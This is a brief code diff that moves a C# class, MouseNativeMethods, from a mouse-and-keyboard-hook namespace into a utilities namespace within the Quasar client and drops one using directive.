@@ -2,10 +2,9 @@
 // Copyright (c) 2015 George Mamaladze
 // See license.txt or https://mit-license.org/
 
-using Quasar.Client.Utilities;
 using System.Runtime.InteropServices;
 
-namespace Quasar.Client.MouseKeyHook.WinApi
+namespace Quasar.Client.Utilities
 {
     internal static class MouseNativeMethods
     {
